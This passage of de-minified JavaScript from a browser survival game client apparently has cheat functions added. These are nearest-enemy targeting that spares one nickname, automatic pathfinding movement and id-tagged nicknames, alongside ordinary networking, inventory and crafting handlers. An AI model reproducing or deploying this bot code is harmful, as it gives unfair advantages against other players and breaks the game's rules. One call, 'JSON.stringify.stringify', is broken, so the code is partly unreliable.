                                case 34:
                                case 18:
                                case 33:
                                case 15:
                                case 14:
                                case 13:
                                case 12:
                                case 16:
                                case 17:
                                    return 2;
                                case 57:
                                case 5:
                                case 6:
                                case 30:
                                case 62:
                                case 9:
                                case 0:
                                case 63:
                                case 19:
                                    return 1;
                                case 64:
                                case 65:
                                case 66:
                                case 67:
                                case 68:
                                case 70:
                                case 69:
                                    return 3;
                                case 45:
                                    if (t)
                                        return 4;
                                case -1:
                                    if (t)
                                        return 5
                            }
                            return 0
                        }
                        ,
                        this.dist2dSQRT = function (e, t) {
                            return e && t ? Math.sqrt((e.x - t.x) ** 2 + (e.y - t.y) ** 2) : null
                        }
                        ,
                        this.gogo = Date.now(),
                        this.gogo2 = Date.now(),
                        this.findenemiesrangexyzbooboo = function (e, t) {
                            this.xyz = null,
                                this.aaa22 = -1,
                                this.NOWAY = 2 === this.WHATTHEFUCK(e.right, !1);
                            for (var i, n = 0, r = t.length, o = null; n < r; ++n)
                                if ((o = t[n]).pid !== e.pid && !o.player.nickname.includes("山田") && !o.ally && e.fly === o.fly && !o.ghost) {
                                    if (i = (e.x - o.x) ** 2 + (e.y - o.y) ** 2,
                                        this.NOWAY && i < 330)
                                        continue;
                                    (-1 === this.aaa22 || i < this.aaa22) && (this.aaa22 = i,
                                        this.xyz = o)
                                }
                            return this.xyz
                        }
                        ,
                        this.boompathfind = function (e, t) {
                            var i;
                            t.x <= Fe.nw && 0 <= t.x && t.y <= Fe.nh && 0 <= t.y && (4e3 < Date.now() - this.gogo2 && (this.gogo2 = Date.now(),
                                client.sendJson([0, " Pathfinding . . . "])),
                                i = (t => {
                                    let i = new PF.Grid(Fe.nw, Fe.nh)
                                        , n = ["la", "cs", "t", "b", "f", "plm", "p", "g", "s", "re", "c", "a", "m", 53, !1]
                                        , r = Fe.units[Ye.FRUIT];
                                    if (r)
                                        for (let e = 0; e < r.length; e++)
                                            Math.floor(r[e].x / 100) == t.x && Math.floor(r[e].y / 100) == t.y || i.setWalkableAt(Math.floor(r[e].x / 100), Math.floor(r[e].y / 100), !1);
                                    return [4, 7, 8, 9, 19, 20, 12, 13, 14, 5, 29, 50, 52].forEach(function (e) {
                                        if (r = Fe.units[e])
                                            for (let e = 0; e < r.length; e++)
                                                Math.floor(r[e].x / 100) == t.x && Math.floor(r[e].y / 100) == t.y || i.setWalkableAt(Math.floor(r[e].x / 100), Math.floor(r[e].y / 100), !1)
                                    }),
                                        Eo.tiles.flat(2).map(e => {
                                            let t = Object.keys(e)[0]
                                                , i = e[t];
                                            return {
                                                type: t,
                                                x: (i = null != (i = null != i.length ? i[i.length - 1] : i).length ? i[i.length - 1] : i).x,
                                                y: i.y
                                            }
                                        }
                                        ).filter(e => n.includes(e.type)).forEach(e => {
                                            var t = Math.floor(e.x / 100)
                                                , e = Math.floor(e.y / 100);
                                            i.setWalkableAt(t, e, !1),
                                                i.setWalkableAt(t - 1, e, !1),
                                                i.setWalkableAt(t + 1, e, !1),
                                                i.setWalkableAt(t, e - 1, !1),
                                                i.setWalkableAt(t, e + 1, !1)
                                        }
                                        ),
                                        i
                                }
                                )((e.x,
                                    e.y), (t.x,
                                        t.y)),
                                0 === (t = new PF.DijkstraFinder({
                                    allowDiagonal: !0,
                                    dontCrossCorners: !0
                                }).findPath(e.x, e.y, t.x, t.y, i)).length ? client.send_move(0) : t[1] && (e.x == t[1][0] && e.y + 1 == t[1][1] && client.send_move(4),
                                    e.x == t[1][0] && e.y - 1 == t[1][1] && client.send_move(8),
                                    e.x - 1 == t[1][0] && e.y == t[1][1] && client.send_move(1),
                                    e.x + 1 == t[1][0] && e.y == t[1][1] && client.send_move(2),
                                    e.x - 1 == t[1][0] && e.y - 1 == t[1][1] && client.send_move(9),
                                    e.x - 1 == t[1][0] && e.y + 1 == t[1][1] && client.send_move(5),
                                    e.x + 1 == t[1][0] && e.y - 1 == t[1][1] && client.send_move(10),
                                    e.x + 1 == t[1][0]) && e.y + 1 == t[1][1] && client.send_move(6))
                        }
                        ,
                        this.store_server_list = function () {
                            this.server_list = JSON.parse(this.xhttp.responseText)
                        }
                        ,
                        this.geolocate_server = function (e) {
                            for (var t = [], i = 0; i < e.length; i++)
                                -1 !== e[i].a.indexOf(re) && t.push(i);
                            return 0 === t.length ? 0 : t[Math.floor(Math.random() * t.length)]
                        }
                        ,
                        this.set_server_list = function (e) {
                            for (var t = 0, i = 0; i < e.length; i++)
                                t += e[i].nu;
                            for (var n = document.getElementById("servselect"), r = (-1 === client.selected_server[client.current_mode] ? client.selected_server[client.current_mode] = n.selectedIndex = client.geolocate_server(e) : n.selectedIndex = client.selected_server[client.current_mode],
                                '<label for="ul-id"><button type="button" class="ng-binding">' + e[n.selectedIndex].a + (0 < e[n.selectedIndex].nu ? " [" + e[n.selectedIndex].nu + " " + We[TEXT.PLAYERS] + "]" : "") + '</button></label><ul role="listbox" id="ul-id" class="md-whiteframe-z1" name="ul-id"><li role="option" id="selectDisabled">' + We[TEXT.CHOOSE] + " (" + this.total_players + ") " + We[TEXT.TOTAL_PLAYERS] + "</li>"), i = 0; i < e.length; i++)
                                r = (r += '<li role="option">' + e[i].a) + (" [" + e[i].nu + " " + We[TEXT.PLAYERS] + "]") + "</li>\n";
                            r += '<li role="option" id="selectDisabled">(' + t + ") " + We[TEXT.TOTAL_MODE] + "</li>",
                                n.innerHTML = r += "</div>",
                                $(".md-select").on("click", function () {
                                    $(this).toggleClass("active")
                                }),
                                $(".md-select ul li").on("click", function () {
                                    for (var e = $(this).text(), t = -1, i = client.mode_list[client.current_mode], n = 0; n < i.length; n++)
                                        if (i[n].a + " [" + i[n].nu + " " + We[TEXT.PLAYERS] + "]" === e) {
                                            t = n;
                                            break
                                        }
                                    -1 !== t && (document.getElementById("servselect").selectedIndex = t,
                                        client.selected_server[client.current_mode] = t,
                                        $(".md-select ul li").removeClass("active"),
                                        $(this).addClass("active"),
                                        $(".md-select label button").text(e))
                                })
                        }
                        ,
                        this.total_players = 0,
                        this.update_server_list = function () {
                            for (var e = this.total_players = 0; e < client.server_list.length; e++)
                                -1 !== this.server_list[e].a.search("COM") ? (this.server_list[e].a = this.server_list[e].a.replace("COM", ""),
                                    this.mode_list[6].push(this.server_list[e])) : -1 !== this.server_list[e].a.search("CLOSED") || -1 !== this.server_list[e].a.search("OPEN") ? this.mode_list[1].push(this.server_list[e]) : -1 !== this.server_list[e].a.search("EXP") ? (this.mode_list[7].push(this.server_list[e]),
                                        this.server_list[e].a = this.server_list[e].a.replace("EXP", "")) : (-1 !== this.server_list[e].a.search("DAY") ? this.mode_list[2] : -1 !== this.server_list[e].a.search("LEGACY") ? (this.server_list[e].a = this.server_list[e].a.replace("LEGACY", ""),
                                            this.mode_list[4]) : -1 !== this.server_list[e].a.search("BATR") ? (this.server_list[e].a = this.server_list[e].a.replace("BATR", ""),
                                                this.mode_list[4]) : -1 !== this.server_list[e].a.search("VAMP") ? (this.server_list[e].a = this.server_list[e].a.replace("VAMP", ""),
                                                    this.mode_list[3]) : this.mode_list[0]).push(this.server_list[e]),
                                    this.total_players += this.server_list[e].nu;
                            for (e = 0; e < this.mode_list.length; e++)
                                0 === this.mode_list[e].length && this.mode_list[e].push({
                                    a: We[TEXT.COMMING_SOON],
                                    nu: 0,
                                    i: "127.0.0.1",
                                    p: 80
                                });
                            this.set_server_list(this.mode_list[0]),
                                this.select_gamemode = function (e) {
                                    client.current_mode = e,
                                        client.set_server_list(client.mode_list[client.current_mode]),
                                        client.set_server_list(client.mode_list[client.current_mode]),
                                        document.getElementById("servselect").selectedIndex = client.current_mode
                                }
                        }
                        ,
                        this.timeout_server = 0,
                        this.timeout_number = 0,
                        this.timeout_handler = null,
                        this.timeout = function () {
                            a.timeout_number++,
                                a.socket.close(),
                                a.timeout_number > i2.TIMEOUT_NUMBER ? (Se.error_level = i2.ERROR_REFUSED,
                                    a.new_alert(We[TEXT.YOU_CANNOT_JOIN]),
                                    Se.waiting = !1,
                                    xe.reconnect.enabled && Je.quit(Se.run)) : a.connect_timeout()
                        }
                        ,
                        this.kick = function (e) {
                            this._current_id == this.socket._current_id && (this._current_id++,
                                this.new_alert(We[TEXT.KICKED] + e),
                                Je.quit(Se.run))
                        }
                        ,
                        this.mute = function () {
                            this.new_alert("You speak too much")
                        }
                        ,
                        this.already_used_key = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.KEY_ALREADY]),
                                Se.waiting = !1
                        }
                        ,
                        this.hide_shop_kit = function () {
                            xe.shop.open = !1
                        }
                        ,
                        this.hide_recipe_book = function () {
                            Je.show_recipe_book = 0
                        }
                        ,
                        this.hide_clock = function () {
                            Je.show_clock = 0
                        }
                        ,
                        this.sand_tempest = function (e) {
                            xe.desert.tempest = e,
                                -300 < Fe.dist_desert && (0 === e ? this.new_alert(We[TEXT.TEMPEST_OFF]) : this.new_alert(We[TEXT.TEMPEST_ON]))
                        }
                        ,
                        this.bandage = function (e) {
                            xe.bandage = e
                        }
                        ,
                        this.blizzard_status = function (e) {
                            xe.blizzard = e
                        }
                        ,
                        this.blizzard = function (e) {
                            xe.winter.tempest = e,
                                -300 < Fe.dist_winter && (0 === e ? this.new_alert(We[TEXT.BLIZZARD_OFF]) : this.new_alert(We[TEXT.BLIZZARD_ON]))
                        }
                        ,
                        this.explorer_quest = function (e) {
                            0 === e ? document.getElementById("exploreForest").src = "img/forest-leaf-ok.png" : 1 === e ? document.getElementById("exploreWinter").src = "img/winter-flake-ok.png" : 2 === e ? document.getElementById("exploreLava").src = "img/lava-volcano-ok.png" : 3 === e && (document.getElementById("exploreDesert").src = "img/desert-cactus-ok.png")
                        }
                        ,
                        this.hide_market = function () {
                            Je.show_market = 0
                        }
                        ,
                        this.hide_quest = function () {
                            Je.show_quest = 0
                        }
                        ,
                        this.clean_inventory = function () {
                            xe.inv.can_select = [],
                                xe.inv.n = [],
                                xe.inv.id = -1,
                                xe.inv.drag.stop(),
                                xe.craft.can_craft = [],
                                xe.craft.crafting = !1,
                                xe.craft.can_build = !1,
                                xe.craft.preview = -1,
                                xe.craft.id = -1,
                                xe.craft.workbench = !1,
                                xe.craft.well = !1,
                                xe.craft.fire = !1,
                                xe.craft.water = !1,
                                xe.craft.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1)
                        }
                        ,
                        this.wrong_key = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(),
                                Se.waiting = !1
                        }
                        ,
                        this.commands = function (e) {
                            for (var t = 0; t < e.length; t++)
                                "string" == typeof e[t] && (e[t] = Utils.escape_html(e[t]));
                            xe.terminal.write_command(e[1], e[2], e[3], e[4] instanceof Array ? xe.terminal.create_array(e[4], 5 < e.length ? e[5] : []) : e[4])
                        }
                        ,
                        this.message = function (e) {
                            this.new_alert(e)
                        }
                        ,
                        this.wrong_password = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.WRONG_PASSWORD]),
                                Se.waiting = !1
                        }
                        ,
                        this.new_version = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.NEW_VERSION]),
                                Se.waiting = !1
                        }
                        ,
                        this.old_version = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.OLD_VERSION]),
                                Se.waiting = !1
                        }
                        ,
                        this.denied_with_callback = function (e) {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(e),
                                Se.waiting = !1
                        }
                        ,
                        this.get_bag = function () {
                            xe.inv.update_bag_size(1, 0),
                                Je.update_inv_buttons()
                        }
                        ,
                        this.verified_account = function (e) {
                            var t = e[1]
                                , i = Fe.players[t]
                                , i = (i.skin = e[2],
                                    i.accessory = e[3],
                                    i.baglook = e[4],
                                    i.book = e[5],
                                    i.crate = e[6],
                                    i.dead = e[7],
                                    i.level = e[8],
                                    Fe.fast_units[t * Fe.max_units]);
                            i && (i.skin = e[2],
                                i.accessory = e[3],
                                i.baglook = e[4],
                                i.book = e[5])
                        }
                        ,
                        this.build_stop = function (e) {
                            e === Be.BAG ? (xe.inv.update_bag_size(1, 0),
                                Je.update_inv_buttons()) : this.gather([0, e, 1]),
                                xe.craft.restart()
                        }
                        ,
                        this.recycle_ok = function (e) {
                            xe.auto_feed.delay = 0,
                                xe.craft.do_recycle(e)
                        }
                        ,
                        this.recycle_stop = function (e) {
                            for (var t = Te[e].r, i = 0; i < t.length; i++)
                                if (xe.inv.max > xe.inv.can_select.length || 0 < xe.inv.n[t[i][0]]) {
                                    var n = Math.floor(.8 * t[i][1]);
                                    if (!n)
                                        continue;
                                    this.gather([0, t[i][0], n])
                                }
                            xe.craft.restart()
                        }
                        ,
                        this.build_ok = function (e) {
                            xe.auto_feed.delay = 0,
                                xe.craft.do_craft(e)
                        }
                        ,
                        this.new_alert = function (e) {
                            xe.alert.text ? e !== xe.alert.text && e !== xe.alert.list[xe.alert.list.length - 1] && xe.alert.list.push(e) : xe.alert.text = e
                        }
                        ,
                        this.no_resources = function () {
                            this.new_alert(We[TEXT.NO_MORE_RESOURCES])
                        }
                        ,
                        this.survive = function () {
                            var e = 0 == xe.day ? We[TEXT.SURVIVED_1DAY] : We[TEXT.SURVIVED] + (xe.day + 1) + We[TEXT.DAYS];
                            this.new_alert(e),
                                xe.day++
                        }
                        ,
                        this.fail_restore = function () {
                            clearTimeout(a.timeout_handler),
                                xe.reconnect.enabled = !1,
                                xe.alive = !1,
                                this.new_alert(We[TEXT.DEAD_SAD]),
                                Je.quit(Se.run),
                                this.socket.close()
                        }
                        ,
                        this.blocked = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.SPAM_ME]),
                                Se.waiting = !1
                        }
                        ,
                        this.kicked_before_join = function (e) {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(e),
                                Se.waiting = !1
                        }
                        ,
                        this.full = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert(We[TEXT.SPAM_ME2]),
                                Se.waiting = !1
                        }
                        ,
                        this.throttle = function () {
                            clearTimeout(this.timeout_handler),
                                this.new_alert("Connection throttled, spam play button!"),
                                Se.waiting = !1
                        }
                        ,
                        this.new_player = function (e) {
                            var t = e[1]
                                , i = Fe.players;
                            i[t].nickname = e[2],
                                i[t].skin = e[3],
                                i[t].accessory = e[4],
                                i[t].baglook = e[5],
                                i[t].book = e[6],
                                i[t].crate = e[7],
                                i[t].dead = e[8],
                                i[t].level = e[9],
                                i[t].score = 0,
                                i[t].ldb_label = null,
                                i[t].label = null,
                                i[t].label_winter = null,
                                i[t].alive = !0,
                                1 == $r && (i[t].nickname += "|" + t)
                        }
                        ,
                        this.get_focus = function () {
                            this.sendJson([11])
                        }
                        ,
                        this.empty_res = function () {
                            this.new_alert(We[TEXT.EMPTY])
                        }
                        ,
                        this.inv_full = function () {
                            this.new_alert(We[TEXT.INV_FULL])
                        }
                        ,
                        this.choose_kit = function (e) {
                            this.sendJson([21, e]),
                                xe.shop.open = !1
                        }
                        ,
                        this.kit_ok = function (e) {
                            for (var t = t2[e - 1].items, i = 0; i < t.length && xe.inv.max > xe.inv.can_select.length; i++) {
                                var n = t[i][1]
                                    , r = t[i][0];
                                t[i][1] === Be.BAG ? xe.inv.update_bag_size(1, 0) : this.gather([0, n, r])
                            }
                        }
                        ,
                        this.gather = function (e) {
                            for (var t = e.length, i = xe.inv, n = 1; n < t; n += 2) {
                                for (var r = e[n], o = e[n + 1], a = 0; a < i.can_select.length; a++)
                                    if (i.can_select[a].id == r) {
                                        i.n[r] += o;
                                        break
                                    }
                                a == i.can_select.length && (i.n[r] = o,
                                    i.can_select.push(Je.inv_buttons[r]),
                                    Je.update_inv_buttons())
                            }
                            xe.craft.update()
                        }
                        ,
                        this.gauges = function (e, t, i, n, r, o, a) {
                            xe.gauges.l = e / 100,
                                xe.gauges.h = t / 100,
                                xe.gauges.c = i / 100,
                                xe.gauges.t = n / 100,
                                xe.gauges.o = r / 100,
                                xe.gauges.wa = o / 100,
                                xe.bandage = a
                        }
                        ,
                        this.succeed_quest = function (e) {
                            Je.quests.modify(e, 2)
                        }
                        ,
                        this.fail_quest = function (e) {
                            Je.quests.modify(e, 0)
                        }
                        ,
                        this.claimed = function (e) {
                            Je.quests.modify(e, 3)
                        }
                        ,
                        this.gauges_life = function (e, t) {
                            xe.gauges.l = e / 100,
                                xe.bandage = t
                        }
                        ,
                        this.gauges_water = function (e) {
                            xe.gauges.t = e / 100
                        }
                        ,
                        this.gauges_food = function (e) {
                            xe.gauges.h = e / 100
                        }
                        ,
                        this.gauges_warm = function (e) {
                            xe.gauges.wa = e / 100
                        }
                        ,
                        this.gauges_cold = function (e) {
                            xe.gauges.c = e / 100
                        }
                        ,
                        this.get_time = function (e) {
                            console.log(e),
                                Fe.time = e[1],
                                Fe.transition = !0,
                                Xe.transition = 1
                        }
                        ,
                        this.change_ground = function () {
                            document.getElementById("game_body").style.backgroundColor = ze.GROUND[Fe.time]
                        }
                        ,
                        this.kill_player = function (e) {
                            Fe.mode == Ue.MODE_HUNGER_GAMES && "spectator" !== Fe.players[e].nickname && this.new_alert(Fe.players[e].nickname + We[TEXT.DEAD]),
                                Fe.players[e].alive = !1
                        }
                        ,
                        this.set_cam = function (e) {
                            e = new Uint16Array(e);
                            player.cam.change(e[1], e[2])
                        }
                        ,
                        this.recover_focus = function (e) {
                            e = new s2(0, xe.id, xe.id, e[3], e[4], e[5], e[6], e[7], e[8], e[9]);
                            Fe.fast_units[1e3 * xe.id] = e,
                                xe.cam.change(x, y)
                        }
                        ,
                        this.remove_entity = function (e) {
                            for (var t = new Uint16Array(e), i = (t.length - 1) / 4, n = 0; n < i; n++) {
                                var r = 4 * n
                                    , o = t[1 + r]
                                    , r = t[2 + r] * Fe.max_units + o;
                                Fe.delete_units(r)
                            }
                        }
                        ,
                        this.hitten = function (e, t = 0) {
                            var i = new Uint16Array(e)
                                , n = (i.length - 1) / 4;
                            if (0 == t)
                                for (var r = 0; r < n; r++) {
                                    var o, a = i[1 + (d = 4 * r)], s = i[2 + d], _ = (i[3 + d] >> 1) / 127 * Math.PI * 2, E = i[4 + d], u = Eo.tiles[s][a];
                                    switch (E) {
                                        case 0:
                                            (o = u.p[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 1:
                                            (o = u.s[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 2:
                                            (o = u.s[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 3:
                                            (o = u.s[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 4:
                                            (o = u.t[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 5:
                                            (o = u.t[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 6:
                                            (o = u.t[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 7:
                                            (o = u.t[3][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 8:
                                            (o = u.t[4][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 9:
                                            (o = u.t[5][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 10:
                                            (o = u.g[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 11:
                                            (o = u.g[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 12:
                                            (o = u.g[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 13:
                                            (o = u.d[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 14:
                                            (o = u.d[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 15:
                                            (o = u.d[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 16:
                                            (o = u.b[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 17:
                                            (o = u.b[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 18:
                                            (o = u.b[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 19:
                                            (o = u.b[3][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 20:
                                            (o = u.f[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 21:
                                            (o = u.f[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 22:
                                            (o = u.f[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 23:
                                            (o = u.sw[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 24:
                                            (o = u.sw[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 25:
                                            (o = u.sw[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 26:
                                            (o = u.gw[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 27:
                                            (o = u.gw[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 28:
                                            (o = u.gw[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 29:
                                            (o = u.dw[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 30:
                                            (o = u.dw[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 31:
                                            (o = u.dw[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 32:
                                            (o = u.a[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 33:
                                            (o = u.a[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 34:
                                            (o = u.a[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 35:
                                            (o = u.cs[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 36:
                                            (o = u.cs[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 37:
                                            (o = u.cs[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 38:
                                            (o = u.cs[3][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 40:
                                            (o = u.plm[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 41:
                                            (o = u.plm[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 42:
                                            (o = u.plm[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 50:
                                            (o = u.re[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 51:
                                            (o = u.re[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 52:
                                            (o = u.re[2][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 55:
                                            (o = u.c[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 56:
                                            (o = u.m[0][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 57:
                                            (o = u.m[1][0]).angle = _,
                                                o.update = !0;
                                            break;
                                        case 58:
                                            (o = u.m[2][0]).angle = _,
                                                o.update = !0
                                    }
                                }
                            if (1 == t)
                                for (r = 0; r < n; r++) {
                                    var d, E = i[1 + (d = 4 * r)], T = i[2 + d], T = (_ = (i[3 + d] >> 1) / 127 * Math.PI * 2,
                                        Fe.fast_units[T * Fe.max_units + E]);
                                    T && T.hit && (T.hit.angle = _,
                                        T.hit.update = _)
                                }
                        }
                        ,
                        this.resurrection = function () {
                            this.sendJson([17, xe.resurrection.pid, xe.resurrection.iid])
                        }
                        ,
                        this.give_wheat = function (e, t) {
                            this.sendJson([22, t, e.pid, e.iid])
                        }
                        ,
                        this.give_bread_oven = function (e, t, i) {
                            t ? this.sendJson([25, t, e.pid, e.iid]) : this.sendJson([24, i, e.pid, e.iid])
                        }
                        ,
                        this.take_bread = function (e) {
                            this.sendJson(JSON.stringify.stringify([26, e.pid, e.iid]))
                        }
                        ,
                        this.claim_quest_reward = function (e) {
                            this.sendJson([27, e])
                        }
                        ,
                        this.give_well = function (e) {
                            this.sendJson([30, e.pid, e.iid])
                        }
                        ,
                        this.give_wood_extractor = function (e, t) {
                            this.sendJson([38, t, e.pid, e.iid, e.type])
                        }
                        ,
                        this.give_wood = function (e, t) {
                            this.sendJson([12, t, e.pid, e.iid])
                        }
                        ,
                        this.give_item = function (e, t, i) {
                            this.sendJson([8, t, i, e.pid, e.iid])
                        }
                        ,
                        this.take_extractor = function (e) {
                            this.sendJson([37, e.pid, e.iid, e.type])
                        }
                        ,
                        this.take_flour = function (e) {
                            this.sendJson([23, e.pid, e.iid])
                        }
                        ,
                        this.take_chest = function (e) {
                            this.sendJson([9, e.pid, e.iid])
                        }
                        ,
                        this.unlock_chest = function (e) {
                            this.sendJson([15, e.pid, e.iid])
                        }
                        ,
                        this.lock_chest = function (e) {
                            this.sendJson([16, e.iid])
                        }
                        ,
                        this.kick_team = function (e) {
                            a.sendJson([20, xe.totem.id, xe.team[e]])
                        }
                        ,
                        this.join_team = function () {
                            a.sendJson([18, xe.totem.pid, xe.totem.id])
                        }
                        ,
                        this.leave_team = function () {
                            a.sendJson([19])
                        }
                        ,
                        this.lock_team = function () {
                            a.sendJson([35, xe.totem.id]),
                                "LOCK" == document.getElementById("lock_team").innerHTML ? (xe.totem.lock = 1,
                                    document.getElementById("lock_team").innerHTML = "UNLOCK") : (xe.totem.lock = 0,
                                        document.getElementById("lock_team").innerHTML = "LOCK")
                        }
                        ,
                        this.units = function (e, t, i) {
                            var n = new Uint16Array(e);
                            i && Fe.delete_all_units();
                            for (var r = (t.length - 2) / 18, o = 0; o < r; o++) {
                                var a, s, _, E, u, d, T = 2 + 18 * o, A = 1 + 9 * o, h = t[T], l = n[1 + A], I = n[5 + A], c = h * Fe.max_units + I;
                                l & R.DELETE ? Fe.delete_units(c) : (a = n[2 + A],
                                    s = n[3 + A],
                                    _ = n[4 + A],
                                    E = n[6 + A],
                                    u = n[7 + A],
                                    A = n[8 + A],
                                    T = t[1 + T] / 255 * Math.PI * 2,
                                    Fe.fast_units[c] ? ((d = Fe.fast_units[c]).r.x = s,
                                        d.r.y = _,
                                        0 != h && Utils.dist(d, d.r) > i2.LAG_DISTANCE && (d.x = s,
                                            d.y = _),
                                        d.id === xe.id && 0 !== h || (d.nangle = T),
                                        d.action |= l,
                                        d.info = E,
                                        d.speed = u,
                                        d.extra = A,
                                        d.update && d.update(l)) : (d = new s2(a, h, I, s, _, T, l, E, u, A),
                                            Fe.fast_units[c] = d,
                                            Fe.units[a].push(d)))
                            }
                        }
                        ,
                        this.leaderboard = function (e) {
                            this.timeout_server = ho,
                                xe.ldb.init(e)
                        }
                        ,
                        this.new_recipes = function (e) {
                            if (void 0 !== de && (Te = de),
                                0 < e.length) {
                                de = JSON.parse(JSON.stringify(Te));
                                for (var t = 0; t < e.length; t++) {
                                    var i = e[t]
                                        , n = Te[i.item];
                                    console.log(i, n),
                                        void 0 !== n && (n.r = i.recipe,
                                            n.w = i.workbench,
                                            n.f = i.fire,
                                            n.o = i.water,
                                            n.e = i.well,
                                            n.time = 1 / i.time)
                                }
                            }
                        }
                        ,
                        this.welcome = function (e) {
                            e && 0 !== e.length ? xe.welcome.message = function (e) {
                                var t = document.createElement("canvas")
                                    , i = t.getContext("2d");
                                for (i.lineJoin = "round"; -1 !== e.indexOf("\\n");)
                                    e = e.replace("\\n", "\n");
                                e = e.split("\n"),
                                    color = [];
                                var n = 18 * e.length + 10
                                    , r = 0;
                                i.font = "14px Baloo Paaji";
                                for (var o = 0; o < e.length; o++)
                                    "#" === e[o].charAt(0) ? (color[o] = e[o].substring(0, 7),
                                        e[o] = e[o].substring(8)) : color[o] = "#FFFFFF",
                                        r = Math.max(i.measureText(e[o]).width + 16, r);
                                for (t.height = n,
                                    t.width = r,
                                    o = 0; o < e.length; o++) {
                                    var a = Tt(1, e[o], 14, color[o], null, null, null, null, null, "#000", 6);
                                    i.drawImage(a, 8, 18 * o + 5)
                                }
                                return t
                            }(e) : xe.welcome.message = void 0
                        }
                        ,
                        this.chat = function (e) {
                            var t = Fe.fast_units[e[1] * Fe.max_units];
                            t && (Fe.mode === Ue.MODE_ZOMBIES && t.skin === Ue.ZOMBIE_SKIN ? xe.zombie ? .5 < Math.random() ? t.text.push(e[2] + " ..." + ZOMBIE_GRUMBLE) : t.text.push(ZOMBIE_GRUMBLE + "... " + e[2]) : t.text.push(ZOMBIE_GRUMBLES[Math.floor(Math.random() * ZOMBIE_GRUMBLES.length)]) : t.text.push(e[2]))
                        }
                        ,
                        this.select_craft = function (e) {
                            return xe.inv.max !== xe.inv.can_select.length || Te[e].id2 === Be.BAG || -1 != xe.inv.find_item(Te[e].id2) || xe.inv.free_place(Te[e].r) ? (this.sendJson([7, e]),
                                1) : (this.inv_full(),
                                    0)
                        }
                        ,
                        this.workbench = function (e) {
                            xe.craft.set_workbench(e)
                        }
                        ,
                        this.well = function (e) {
                            xe.craft.well = e,
                                xe.craft.update()
                        }
                        ,
                        this.fire = function (e) {
                            xe.craft.fire = e,
                                xe.craft.update()
                        }
                        ,
                        this.water = function (e) {
                            xe.craft.water = e,
                                xe.craft.update()
                        }
                        ,
                        this.dont_harvest = function () {
                            this.new_alert(We[TEXT.WRONG_TOOL])
                        }
                        ,
                        this.cancel_craft = function () {
                            xe.craft.restart()
                        }
                        ,
                        this.minimap = function (e) {
                            Je.minimap.players = [];
                            for (var t = Fe.fast_units[xe.uid], i = 0, n = 1; n < e.length; n += 2) {
                                var r = {
                                    x: Math.floor(e[n] * Fe.w / 250),
                                    y: Math.floor(e[n + 1] * Fe.h / 250)
                                };
                                t && !i && !xe.spectator && Utils.dist(r, t) < 250 ? i += 1 : Je.minimap.players.push(r)
                            }
                        }
                        ,
                        this.reborn = function () {
                            xe.resurrection.open = !1,
                                xe.ghost.enabled = !1,
                                xe.ghost.delay = -1,
                                xe.ghost.label = null,
                                xe.ghost.sec = null,
                                xe.ghost.now = -1
                        }
                        ,
                        this.ghost = function (e) {
                            Ue.GHOST_DELAY = e,
                                xe.ghost.enabled = !0,
                                xe.ghost.delay = (new Date).getTime(),
                                xe.ghost.label = null,
                                xe.ghost.now = -1;
